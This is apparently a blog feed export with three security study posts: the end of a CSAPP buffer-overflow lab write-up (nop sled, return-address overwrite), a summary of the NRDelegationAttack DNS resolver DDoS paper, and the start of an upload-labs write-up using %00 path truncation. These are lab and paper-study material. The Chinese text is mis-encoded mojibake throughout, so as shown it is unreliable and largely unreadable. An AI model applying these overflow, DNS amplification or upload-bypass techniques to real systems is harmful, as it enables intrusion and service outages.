·çš„æƒ…å†µä¸‹ï¼Œå¯¹äºç”¨äºè¦†ç›–çš„è¿”å›åœ°å€çš„è¦æ±‚å°±é™ä½äº†ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ•°ç»„çš„åˆ†é…é•¿åº¦ä¸º0x208ï¼ˆ520ï¼‰ä¸ªå­—èŠ‚</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>ï¼ˆ1ï¼‰ä¿®æ”¹getbufnçš„è¿”å›åœ°å€è‡³testnä½¿å…¶èƒ½å¤Ÿç»§ç»­æ‰§è¡Œ</p><p>ï¼ˆ2ï¼‰ä¿®æ”¹eaxçš„å€¼ä¸ºcookie</p><p>ï¼ˆ3ï¼‰è¿˜åŸebpçš„å€¼ï¼Œè¿™é‡Œä¸èƒ½ä½¿ç”¨level3çš„æ–¹æ³•ï¼Œå› ä¸ºæ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶ï¼Œæ ˆç©ºé—´çš„ä½ç½®éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡3ä¸­çš„æ–¹æ³•ä¿®æ”¹å›ºå®šåœ°å€ï¼Œä½†ç”±äºæ¯æ¬¡éƒ½æ˜¯æ‰§è¡Œç›¸åŒçš„ä»£ç ï¼Œé‚£ä¹ˆæ¯æ¬¡æ‰§è¡Œæ—¶æ ˆä¸­å…ƒç´ çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ã€‚åœ¨level3ä¸­å·²ç»åˆ†æäº†ï¼Œæ—§çš„ebpå€¼å·²ç»è¢«è¦†ç›–äº†ï¼Œå› æ­¤å…¶å€¼æ²¡æœ‰åº”ç”¨ä»·å€¼ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡espçš„å€¼æ¢å¤ebpçš„å€¼</p><p>é€šè¿‡é˜…è¯»testnçš„æ±‡ç¼–ï¼Œåœ¨æ¯ä¸€æ¬¡è°ƒç”¨äº† getbufn ä¹‹åï¼Œebp çš„å€¼å°†ä¼šè¢« push è¿›å»ã€‚è¿™ä¸ª ebp å€¼æ˜¯ç­‰äº testn è¢«è°ƒç”¨çš„æ—¶å€™ esp å­˜å‚¨çš„å€¼çš„ã€‚esp å…ˆç”±äºpush ebxè€Œå‡å»äº†4ï¼Œå†æ‰‹åŠ¨å‡å»äº†0x24ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ exp + 0x28 çš„å€¼å°±æ˜¯ä¼ å…¥äº† getbufn å¼€å§‹çš„æ—¶å€™ ebp çš„å€¼ã€‚</p><p>æ‰€ä»¥æ„é€ æ”»å‡»ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001613439.png" alt="image-20231013001613439"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001632974.png" alt="image-20231013001632974"></p><p>æœ€ç»ˆæ„é€ çš„æ”»å‡»ä»£ç åº”è¯¥æœ‰520ï¼ˆç¼“å†²åŒºé•¿åº¦ï¼‰+4ï¼ˆè¦†ç›–ebpï¼‰+4ï¼ˆè¦†ç›–è¿”å›åœ°å€ï¼‰ä¸ªå­—èŠ‚</p><p>è¿”å›åœ°å€çš„é€‰æ‹©å¯ä»¥ä»»æ„è·‘ä¸€æ¬¡ä»£ç ï¼ŒæŸ¥çœ‹ebpä½ç½®å¹¶-0x208å¾—åˆ°çš„å€¼ï¼Œè¿›è¡Œäº”æ¬¡ï¼Œå–æœ€é«˜çš„ä¸€ä¸ªï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ¯æ¬¡æ‰§è¡Œéƒ½ä¼šé€šè¿‡é›ªæ©‡ä¸€è·¯æ»‘åˆ°ç›®æ ‡ä»£ç è¿›è¡Œæ‰§è¡Œ</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231023163626058.png" alt="image-20231023163626058"></p><p>å› ä¸ºæ­¤å¤„å¯¹äºå•ä¸ªç”¨æˆ·è¾“å…¥çš„idæ¥ç”Ÿæˆcookieï¼Œä½œä¸ºrandomçš„ç§å­ï¼Œä½†randomæ˜¯ä¸ªä¼ªéšæœºå‡½æ•°ï¼Œæ‰€ä»¥å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œå¼€è¾Ÿçš„äº”æ¬¡ç©ºé—´éƒ½æ˜¯å›ºå®šçš„ã€‚</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013010919080.png" alt="image-20231013010919080"></p><p>æ‰€ä»¥æ„é€ æ”»å‡»ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005138599.png" alt="image-20231013005138599"></p><p>509ä¸ªnop+15ä¸ªæ“ä½œç +4è¿”å›åœ°å€</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005117564.png" alt="image-20231013005117564"></p>]]></content>
    
    
    <categories>
      
      <category>csapplab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NRDelegationAttack</title>
    <link href="/2023/09/11/NRDelegationAttack/"/>
    <url>/2023/09/11/NRDelegationAttack/</url>
    
    <content type="html"><![CDATA[<h2 id="NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolversï¼ˆNRDelegationAttackï¼šDNSé€’å½’è§£æå™¨çš„å¤æ‚æ€§DDoSæ”»å‡»ï¼‰"><a href="#NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolversï¼ˆNRDelegationAttackï¼šDNSé€’å½’è§£æå™¨çš„å¤æ‚æ€§DDoSæ”»å‡»ï¼‰" class="headerlink" title="NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolversï¼ˆNRDelegationAttackï¼šDNSé€’å½’è§£æå™¨çš„å¤æ‚æ€§DDoSæ”»å‡»ï¼‰"></a>NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolversï¼ˆNRDelegationAttackï¼šDNSé€’å½’è§£æå™¨çš„å¤æ‚æ€§DDoSæ”»å‡»ï¼‰</h2><p>è®ºæ–‡çš„ä¸»é¢˜ä¸ºé’ˆå¯¹ DNS é€’å½’è§£æå™¨çš„ DDoS æ”»å‡»ã€‚è¯¥å·¥ä½œç”±æ¥è‡ª Tel-Aviv University ï¼ˆä»¥è‰²åˆ—ç‰¹æ‹‰ç»´å¤«å¤§å­¦ï¼‰ çš„ DEEPNESS Lab çš„ç ”ç©¶äººå‘˜å®Œæˆã€‚</p><p>åˆ©ç”¨ç³»ç»Ÿåœ¨åº”å¯¹ä¸åˆ©æ¡ä»¶æˆ–å¼‚å¸¸æƒ…å†µæ—¶çš„æ€§èƒ½ç“¶é¢ˆå’Œæ¼æ´ï¼Œä»è€Œæœ‰æ„æˆ–æ¶æ„åœ°å¯¼è‡´ç³»ç»Ÿèµ„æºçš„ä¸åˆç†ä½¿ç”¨æˆ–è€—å°½ã€‚</p><p>Referral response: å¼•èå“åº”ï¼Œæ˜¯æŒ‡åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰ä¸­ï¼Œä¸€ä¸ªæœåŠ¡å™¨å‘å¦ä¸€ä¸ªæœåŠ¡å™¨æä¾›å…³äºå¦‚ä½•è§£æç‰¹å®šæŸ¥è¯¢çš„ä¿¡æ¯çš„å“åº”ã€‚è¿™ç§å“åº”å‘Šè¯‰è¯·æ±‚æœåŠ¡å™¨åº”è¯¥å°†æŸ¥è¯¢è½¬å‘åˆ°å“ªä¸ªå…¶ä»–æœåŠ¡å™¨æ¥è·å–æ‰€éœ€çš„ä¿¡æ¯ã€‚</p><p>åœ¨DNSä¸­ï¼Œå¼•èå“åº”é€šå¸¸æ˜¯ç”±æƒå¨DNSæœåŠ¡å™¨æä¾›çš„ã€‚å½“ä¸€ä¸ªDNSæœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªæŸ¥è¯¢ï¼Œä½†å®ƒä¸æ‹¥æœ‰ä¸è¯¥æŸ¥è¯¢ç›¸å…³çš„ä¿¡æ¯æ—¶ï¼Œå®ƒå¯ä»¥å‘è¯·æ±‚æœåŠ¡å™¨è¿”å›ä¸€ä¸ªå¼•èå“åº”ï¼ŒæŒ‡ç¤ºè¯·æ±‚æœåŠ¡å™¨å°†æŸ¥è¯¢å‘é€åˆ°å¦ä¸€ä¸ªDNSæœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯æ›´é«˜çº§åˆ«çš„DNSæœåŠ¡å™¨ï¼Œä»¥è·å–æ‰€éœ€çš„ä¿¡æ¯ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¿½æº¯åˆ°æ ¹DNSæœåŠ¡å™¨ï¼Œä»¥ä¾¿æœ€ç»ˆæ‰¾åˆ°ä¸æŸ¥è¯¢ç›¸å…³çš„IPåœ°å€æˆ–å…¶ä»–èµ„æºè®°å½•ã€‚</p><h4 id="Glue-record"><a href="#Glue-record" class="headerlink" title="Glue record"></a>Glue record</h4><p>æ™®é€šçš„DNSè®°å½•æ˜¯ä¿å­˜åœ¨æƒå¨æœåŠ¡å™¨ä¸Šçš„ï¼Œèƒ¶æ°´è®°å½•æ˜¯ä¿å­˜åœ¨æ³¨å†Œå±€çš„DNSæœåŠ¡å™¨ä¸Šçš„</p><p>ç®€è¿°ä¸€ä¸ªDNSæŸ¥è¯¢æµç¨‹ï¼šè‹¥è¦æŸ¥è¯¢jd.com</p><ol><li>è·å–æ ¹æœåŠ¡å™¨åˆ—è¡¨</li><li>å‘æ ¹æœåŠ¡å™¨å‘é€æŸ¥è¯¢ï¼ˆâ€œè¯·é—®ä½ æœ‰jd.comå—ï¼Ÿâ€ â€œæ²¡æœ‰ï¼Œä½†ä½ å¯ä»¥æ‰¾.comé—®é—®ï¼Œæˆ‘æ­£å¥½æœ‰ä»–ä»¬çš„ipåœ°å€ï¼Œé¡ºå¸¦ç»™ä½ å§â€ï¼‰</li><li>å‘.comæƒå¨æœåŠ¡å™¨å‘é€æŸ¥è¯¢ï¼ˆâ€œè¯·é—®ä½ æœ‰jd.comå—â€ â€œæ²¡æœ‰ï¼Œä½†ä½ å¯ä»¥æ‰¾ç®¡ç†jd.comçš„æœåŠ¡å™¨é—®é—®ï¼Œæˆ‘æ­£å¥½æœ‰ä»–ä»¬çš„ipåœ°å€ï¼Œç»™ä½ å§â€ï¼‰</li><li>å‘jd.comåŸŸåæƒå¨æœåŠ¡å™¨å‘é€æŸ¥è¯¢ï¼ˆâ€œè¯·é—®ä½ æœ‰jd.comå—â€ â€œæœ‰çš„ï¼Œç»™ä½ å§â€ï¼‰</li></ol><p>åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ï¼Œ2ï¼Œ3æ­¥è¿”å›çš„ç»“æœä¸­ï¼Œé¡ºå¸¦ç»™çš„ipåœ°å€å°±æ˜¯èƒ¶æ°´è®°å½•ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™éœ€è¦<strong>é¢å¤–çš„æŸ¥è¯¢å»è·å¾—ipåœ°å€</strong>ï¼ˆé€’å½’è§£æå™¨å¼€å¯ä¸»åŠ¨è§£æè¿›ç¨‹ï¼Œæ¯ä¸ªåç§°æœåŠ¡å™¨å¯åŠ¨ä¸€ä¸ªç‹¬ç«‹çš„é€’å½’çŠ¶æ€ï¼ŒæŸ¥è¯¢æƒå¨æœåŠ¡å™¨æä¾›çš„å…¨éƒ¨åç§°æœåŠ¡å™¨çš„ipåœ°å€ï¼Œæ­¤è¿‡ç¨‹å°†æ¶ˆè€—å¤§é‡çš„æœåŠ¡å™¨èµ„æºï¼‰</p><p>åŒæ—¶ï¼Œå‡è®¾åœ¨è‡ªå»ºæœåŠ¡å™¨ä¸­ï¼Œexample.comä½¿ç”¨ns1.example.comå’Œns2.example.comä½œä¸ºæƒå¨æœåŠ¡å™¨</p><p>ä¸ºäº†è§£æexample.comï¼Œè‹¥æ²¡æœ‰èƒ¶æ°´è®°å½•ï¼Œåˆ™æ— æ³•çŸ¥é“ns1.exampleå’Œns2.example.comçš„ipï¼Œé‚£ä¹ˆä¸ºäº†è§£æns1.example.comçš„åœ°å€ï¼Œåˆéœ€è¦è§£æexample.comï¼Œä»è€Œé™·å…¥å¾ªç¯</p><h4 id="NXNSAttackæ”»å‡»"><a href="#NXNSAttackæ”»å‡»" class="headerlink" title="NXNSAttackæ”»å‡»"></a>NXNSAttackæ”»å‡»</h4><p>é€šè¿‡å‘æŸä¸€é€’å½’è§£æå™¨æŸ¥è¯¢æ”»å‡»è€…çš„æƒå¨æœåŠ¡å™¨æˆæƒåŸŸåçš„å­åŸŸåå‘èµ·å¤§é‡æŸ¥è¯¢è¯·æ±‚ï¼Œè‡´ä½¿æ”»å‡»è€…çš„æ¶æ„æŸ¥è¯¢æµé‡åœ¨è§£æè¿‡ç¨‹ä¸­è¢«æ”¾å¤§ï¼Œæœ€ç»ˆå¯¼è‡´é€’å½’è§£æå™¨ä¸å—å®³è€…åŸŸåçš„æƒå¨åŸŸåæœåŠ¡å™¨é­å—æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><p>å¨èƒæ¨¡å‹ï¼š</p><p>NXNSAttackçš„æ”»å‡»è€…æ‹¥æœ‰ä¸€ä¸ªäºŒçº§åŸŸåï¼Œå¦‚attack.comå¹¶ç»´æŠ¤å…¶æƒå¨æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¯ä»¥ä¸ºè¯¥åŸŸé…ç½®å¤§é‡ä¸åŒçš„å­åŸŸå</p><p>ä¸ºè¿™äº›å­åŸŸåè®¾ç½®NSè®°å½•ï¼Œå°†è¿™äº›å­åŸŸåçš„è§£ææˆæƒåˆ°å—å®³è€…åŸŸåï¼Œå¦‚victim.comçš„å¤šä¸ªä¸å­˜åœ¨çš„å­åŸŸåçš„æƒå¨æœåŠ¡å™¨ï¼Œè¿™äº›å­åŸŸåå®é™…ä¸Šä¸å­˜åœ¨victim.comçš„DNSé…ç½®ä¸­</p><p>æ”»å‡»æµç¨‹ï¼š</p><p><img src="/2023/09/11/NRDelegationAttack/image-20230914150452417.png" alt="image-20230914150452417"></p><ol><li>æ”»å‡»è€…å‘å…¶ç»´æŠ¤çš„ä¸€ä¸ªå­åŸŸåns1.attacker.comå‘èµ·DNSæŸ¥è¯¢è¯·æ±‚ï¼Œæ”»å‡»è€…æ¯æ¬¡æŸ¥è¯¢ä¼šä½¿ç”¨ä¸åŒçš„å­åŸŸåï¼Œä»¥æ­¤æ¥ç»•è¿‡é€’å½’è§£æå™¨çš„ç¼“å­˜æœºåˆ¶</li><li>æ”»å‡»è€…è¯·æ±‚ä¼šåˆ°è¾¾attack.comçš„æƒå¨æœåŠ¡å™¨ï¼Œå¹¶è¿”å›æå‰è®¾ç½®å¥½çš„DNSå“åº”ï¼Œå…¶ä¸­åŒ…å«å¤§é‡çš„NSè®°å½•ï¼Œè¿™äº›è®°å½•æŒ‡å‘å—å®³è€…åŸŸä¸‹çš„ä¸å­˜åœ¨çš„å­åŸŸåï¼Œè€Œä¸”ä¸åŒ…å«glueè®°å½•ï¼Œå³ä¸ä¼šåŒ…å«è¿™äº›å­åŸŸåçš„ipåœ°å€</li><li>å½“é€’å½’è§£æå™¨æ”¶åˆ°å¤§é‡åŒ…å«NSè®°å½•çš„å“åº”åï¼Œä¼šå°è¯•è§£æè¿™äº›NSè®°å½•ï¼Œä»¥ç¡®å®šæ¯ä¸ªåç§°æœåŠ¡å™¨çš„ipåœ°å€ã€‚ä¸ºäº†å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œè§£æå™¨å°±ä¼šå‘victim.comçš„æƒå¨æœåŠ¡å™¨å‘é€å¤§é‡çš„NSè§£æè¯·æ±‚</li><li>ä½†ç”±äºè¿™äº›å­åŸŸåå¹¶ä¸å­˜åœ¨ï¼Œå—å®³è€…åŸŸçš„æƒå¨æœåŠ¡å™¨å°±å›è¿”å›NXå“åº”ï¼ˆName Errorï¼‰</li><li>ç”±äºé€’å½’è§£æå™¨ä¸æ–­åœ°å‘èµ·NSè§£æè¯·æ±‚ï¼Œè€Œå—å®³è€…åŸŸçš„æƒå¨æœåŠ¡å™¨å§‹ç»ˆè¿”å›NXå“åº”ï¼Œå°±ä¼šå ç”¨æœåŠ¡å™¨èµ„æºï¼Œæœ€ç»ˆå¯¼è‡´é€’å½’è§£æå™¨å’Œå—å®³è€…åŸŸåçš„æƒå¨æœåŠ¡å™¨é­å—æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œæ— æ³•å“åº”æ­£å¸¸çš„DNSè¯·æ±‚ã€‚</li></ol><h4 id="ç¼“è§£ç­–ç•¥ï¼šMaxFetch-k"><a href="#ç¼“è§£ç­–ç•¥ï¼šMaxFetch-k" class="headerlink" title="ç¼“è§£ç­–ç•¥ï¼šMaxFetch(k)"></a>ç¼“è§£ç­–ç•¥ï¼šMaxFetch(k)</h4><p>å…·ä½“æ­¥éª¤ï¼š</p><ol><li>å¯¹äºæ¯ä¸€ä¸ªè¯·æ±‚ä¸­çš„1ä¸ªæˆ–kä¸ªåç§°æœåŠ¡å™¨è¿›è¡Œè§£æï¼Œè€Œä¸æ˜¯åœ¨NSè®°å½•å“åº”åˆ°è¾¾é€’å½’è§£æå™¨æ—¶ï¼Œä¸€æ¬¡æ€§æŸ¥è¯¢è¯¥åŒºçš„å…¨éƒ¨åç§°æœåŠ¡å™¨ip</li><li>æ”¶åˆ°ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯å·²ç»è§£æè¿‡çš„åç§°æœåŠ¡å™¨æ—¶ï¼Œè§£æå™¨ä¼šè§£æå¦å¤–kä¸ªåç§°æœåŠ¡å™¨çš„ipåœ°å€</li><li>è§£æè¿‡ç¨‹ä¸€ç›´æŒç»­åˆ°æƒå¨è¿”å›çš„NSè®°å½•å“åº”ä¸­æä¾›çš„æ‰€æœ‰NSè®°å½•è¢«è§£æ</li></ol><p>ä¾‹å¦‚ï¼Œåœ¨BIND9çš„å®ç°ä¸­ï¼Œkä¸º5ï¼Œåœ¨æ”¶åˆ°åŒ…å«è®¸å¤šNSåç§°çš„å¼•ç”¨å“åº”æ—¶ï¼ŒBIND9åªè§£æ5ä¸ªï¼Œå¦‚æœæ‰€æœ‰çš„è§£æéƒ½åå›NXDOMAINï¼ˆåŸŸåä¸å­˜åœ¨æˆ–æ— æ³•è§£æï¼‰ï¼Œåˆ™è§£æç»ˆæ­¢å¹¶å‘å®¢æˆ·ç«¯è¿”å›NYå“åº”ã€‚</p><h4 id="æ”»å‡»åˆ©ç”¨çš„å››ä¸ªDNSæœºåˆ¶"><a href="#æ”»å‡»åˆ©ç”¨çš„å››ä¸ªDNSæœºåˆ¶" class="headerlink" title="æ”»å‡»åˆ©ç”¨çš„å››ä¸ªDNSæœºåˆ¶"></a>æ”»å‡»åˆ©ç”¨çš„å››ä¸ªDNSæœºåˆ¶</h4><h5 id="Slist"><a href="#Slist" class="headerlink" title="Slist"></a>Slist</h5><p>â€œSLISTâ€ æœºåˆ¶åœ¨ RFC-1034 ä¸­æå‡ºã€‚å®ƒåœ¨è§£æå™¨å®ç°ä¸­ç”¨ä½œä¸´æ—¶å­˜å‚¨å™¨ï¼Œç”¨äºè®°å½•åœ¨å¤„ç†å®¢æˆ·ç«¯æŸ¥è¯¢æ—¶æ‰§è¡Œçš„æ¯ä¸ªä¸­é—´åç§°æœåŠ¡å™¨è§£æçš„çŠ¶æ€ã€‚åœ¨ BIND9 ä¸­å…¶è¢«å®ç°ä¸º address-DB (ADB) ã€‚å½“é€’å½’è§£æå™¨æ¥æ”¶åˆ°å“åº”ä¸­æ²¡æœ‰åŒ…å« NS è®°å½•çš„ IP åœ°å€çš„å“åº”æ—¶ï¼Œå…¶å°† NS è®°å½•ä¿å­˜åœ¨ ADB ä¸­ï¼Œå¹¶å¯åŠ¨æ–°çš„ DNS æŸ¥è¯¢æ¥æ”¶é›†è¿™äº› NS æœåŠ¡å™¨çš„ A è®°å½•ã€‚</p><h5 id="Delegation-Response"><a href="#Delegation-Response" class="headerlink" title="Delegation Response"></a>Delegation Response</h5><p>è¦å›ç­”è§£æå™¨çš„æŸ¥è¯¢è¯·æ±‚ï¼Œæƒå¨æœåŠ¡å™¨å¯ä»¥å†³å®šå°†è§£æå·¥ä½œå§”æ‰˜ç»™å¦ä¸€ä¸ªåç§°æœåŠ¡å™¨ã€‚ä¾‹å¦‚å›¾ 2 ä¸­ï¼Œexample1.com å°† e1.example.com çš„è§£æå§”æ‰˜ç»™ www1.example2.com ï¼Œæˆ–è€…å½“è§£æå™¨è·å¾—å¼•ç”¨å“åº”ï¼ˆReferral Response, RRï¼‰ æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚</p><h5 id="Referral-Reponse-Limit"><a href="#Referral-Reponse-Limit" class="headerlink" title="Referral Reponse Limit"></a>Referral Reponse Limit</h5><p>å³ä¸Šæ–‡æåˆ°è¿‡çš„ç¼“è§£æªæ–½ï¼Œå½“æŸ¥è¯¢è¾¾åˆ°é™åˆ¶æ—¶ï¼Œå°†è®¾ç½®ä¸€ä¸ªç‰¹æ®Šæ ‡å¿—ï¼ŒNo_Fetch</p><h5 id="Restart-Event"><a href="#Restart-Event" class="headerlink" title="Restart Event"></a>Restart Event</h5><p>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œè§£æå™¨ä¸­çš„è§£æè¿‡ç¨‹è¢«å§”æ‰˜ç»™ä¸åŒçš„åç§°æœåŠ¡å™¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå°†é‡æ–°å¯åŠ¨å¹¶åœ¨æ–°çš„åç§°æœåŠ¡å™¨ä¸Šç»§ç»­è§£æã€‚è¢«é‡å®šå‘åˆ°çš„â€œæ–°æƒå¨â€æœåŠ¡å™¨å°†ä¼šè¢«è®°å½•åœ¨ ADB ä¸­ã€‚</p><p>åœ¨restartæ—¶ï¼Œè§£æå™¨ä¼šæ¸…é™¤å’Œé‡ç½®ä¸€äº›æ ‡è¯†ä½ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸ºäº†ç¼“è§£ NXNSAttack å¼•å…¥çš„No_Fetchæ ‡è¯†ä½ï¼Œå…¶ç”¨æ¥é™åˆ¶è§£æå™¨æ¯æ¬¡æŸ¥è¯¢çš„NSæ•°é‡ï¼Œå½“No_Fetchä¸º1æ—¶ï¼Œå°†ç»ˆæ­¢æœ¬æ¬¡è§£æã€‚</p><h4 id="NRDelegation-Attackå¨èƒæ¨¡å‹"><a href="#NRDelegation-Attackå¨èƒæ¨¡å‹" class="headerlink" title="NRDelegation Attackå¨èƒæ¨¡å‹"></a>NRDelegation Attackå¨èƒæ¨¡å‹</h4><h5 id="æ”»å‡»æ¡ä»¶ï¼š"><a href="#æ”»å‡»æ¡ä»¶ï¼š" class="headerlink" title="æ”»å‡»æ¡ä»¶ï¼š"></a>æ”»å‡»æ¡ä»¶ï¼š</h5><ol><li>ä¸€ä¸ªæˆ–å¤šä¸ªå¯ä»¥å‘èµ·æ¶æ„æŸ¥è¯¢çš„å®¢æˆ·ç«¯</li><li>ä¸€ä¸ªå¯ä»¥äº§ç”Ÿç‰¹å®šreferral responseçš„å¯æ§æƒå¨æœåŠ¡å™¨</li><li>ä¸å“åº”DNSæŸ¥è¯¢çš„æœåŠ¡å™¨åˆ—è¡¨æˆ–ipåœ°å€</li></ol><h5 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h5><p><img src="/2023/09/11/NRDelegationAttack/image-20230914163958837.png" alt="image-20230914163958837"></p><p><strong>é˜¶æ®µ1</strong></p><ol><li>æ”»å‡»è€…å‘èµ·æ¶æ„æŸ¥è¯¢ï¼Œxyz.referral.com</li><li>å—å®³è€…è§£æå™¨å‘æ”»å‡»è€…æ§åˆ¶çš„æƒå¨æœåŠ¡å™¨æŸ¥è¯¢referral.com</li><li>referral.comå›å¤ä¸€ä¸ªå¤§å‹å¼•ç”¨å“åº”</li></ol><p><strong>é˜¶æ®µ2</strong></p><ol start="4"><li>è§£æå™¨é¦–å…ˆéå†ADBå’Œç¼“å­˜ï¼ŒæŸ¥çœ‹è¿™äº›NSæ˜¯å¦å·²ç»è¢«æŸ¥è¯¢è¿‡ï¼Œå› ä¸ºå­˜åœ¨Aå’ŒAAAAä¸¤ç§è®°å½•ï¼ˆIPv4å’ŒIPv6ï¼‰ï¼Œæ‰€ä»¥ä¼šæŸ¥è¯¢2næ¬¡</li><li>è§£æå™¨æ²¡æœ‰æ‰¾åˆ°NSçš„æœ‰æ•ˆä¿¡æ¯ï¼Œå°±å›å‘èµ·è§£æï¼Œç”±äºReferral Response Limitçš„å­˜åœ¨ï¼Œæ¯æ¬¡åªæŸ¥è¯¢kä¸ª</li></ol><p>æ”»å‡»è€…åˆ©ç”¨å¯æ§çš„æƒå¨åç§°æœåŠ¡å™¨è¿”å›æ²¡æœ‰èƒ¶æ°´è®°å½•çš„è¶…é•¿çš„referral responseï¼ˆå¤§å°è®¾ä¸º n ï¼‰ã€‚æ ¹æ®è§£æå™¨è½¯ä»¶çš„å®ç°ï¼ˆæ–‡ä¸­ä¸»è¦é’ˆå¯¹ BIND9 çš„å®ç°ï¼‰ï¼Œè§£æå™¨é¦–å…ˆå°†éå† ADB å’Œç¼“å­˜ï¼ŒæŸ¥çœ‹è¿™äº› NS æ˜¯å¦ä¹‹å‰æŸ¥è¯¢è¿‡ï¼Œå› ä¸ºå­˜åœ¨ A å’Œ AAAA ä¸¤ç§è®°å½•ï¼Œæ‰€ä»¥ä¼šæŸ¥è¯¢2næ¬¡ï¼Œè¿™æ˜¯ NRDelegationAttack çš„ä¸»è¦æˆå› ä¹‹ä¸€ï¼Œ<strong>æ¯æ¬¡çš„éå†è€—è´¹äº†æœåŠ¡å™¨å¤§é‡çš„è®¡ç®—èµ„æº</strong>ã€‚å½“è§£æå™¨æ²¡æœ‰æ‰¾åˆ° NS çš„æœ‰æ•ˆä¿¡æ¯ï¼Œåˆ™ä¼šå¯¹è¿™äº› NS å‘èµ·è§£æï¼Œç”±äºReferral Response Limité™åˆ¶çš„å­˜åœ¨ï¼Œå› æ­¤ï¼Œè§£æå™¨æ¯æ¬¡ä»…æŸ¥è¯¢æœ‰é™çš„ k ä¸ª NSã€‚</p><p><strong>é˜¶æ®µ3</strong></p><p>å½“è§£æå™¨æŸ¥è¯¢referral responseä¸­çš„NSæ—¶ï¼Œå°†è¢«å¼•å¯¼è‡³æƒå¨æœåŠ¡å™¨ï¼Œå¹¶è§¦å‘å§”æ‰˜å“åº”ï¼Œè¿™æ—¶å€™restartäº‹ä»¶è¢«æ¿€æ´»ï¼ŒNo_Fetchæ ‡è¯†ç¬¦è¢«æ¸…é™¤ï¼Œé‡æ–°å¼€å¯ç¬¬4æ­¥ï¼Œ<strong>é‡æ–°æ£€æŸ¥ADBå’Œç¼“å­˜</strong>ã€‚ç”±äºæ”»å‡»è€…è®¾ç½®çš„æ˜¯ä¸å“åº” DNS æŸ¥è¯¢çš„æœåŠ¡å™¨ï¼Œå› æ­¤ï¼Œè¿™äº›æ— æ³•è·å–åˆ°è¿™äº›NSçš„æœ‰æ•ˆä¿¡æ¯ï¼Œå› æ­¤ï¼Œæ— æ³•åœ¨ADB ä¸­æ›´æ–°è¿™äº› NS çš„ä¿¡æ¯ã€‚æ‰€ä»¥æ­¥éª¤ 10 åªæœ‰åˆ°è¾¾è§£æå™¨çš„å®‰å…¨é™åˆ¶è®¡æ•°å™¨çš„ä¸Šé™æ‰ä¼šåœæ­¢ï¼ŒBIND9 ä¸­è¿™ä¸ªä¸Šé™ä¸º 100ã€‚è¯¥ä¸Šé™å¯¹æ”»å‡»è€…æ¥è¯´å·²ç»å¯ä»¥å®Œæˆæ”»å‡»äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs2</title>
    <link href="/2023/09/07/Upload-labs2/"/>
    <url>/2023/09/07/Upload-labs2/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907100705175.png" alt="image-20230907100705175"></p><p><code>$img_path = $_GET[&#39;save_path&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $file_ext;</code>ï¼šæ„å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶è·¯å¾„ï¼ŒåŒ…æ‹¬æ–‡ä»¶åå’Œæ‰©å±•åã€‚è¿™ä¸ªè·¯å¾„åŸºäºåä¸º <code>&#39;save_path&#39;</code> çš„ GET å‚æ•°ï¼Œä»¥åŠä¸€ä¸ªéšæœºæ•°ã€æ—¥æœŸæ—¶é—´æˆ³å’Œæ–‡ä»¶æ‰©å±•åã€‚æ‰€ä»¥å¯ä»¥é‡‡ç”¨%00è¿›è¡Œæˆªæ–­</p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907104811944.png" alt="image-20230907104811944"></p><p>è¿™é¢˜å˜æˆäº† <code>$_POST[&#39;save_path&#39;]</code> ï¼ŒPOSTæ–¹å¼ä¸ä¼šåƒGETæ–¹å¼ä¸€æ ·ï¼Œæäº¤ç»è¿‡URLç¼–ç 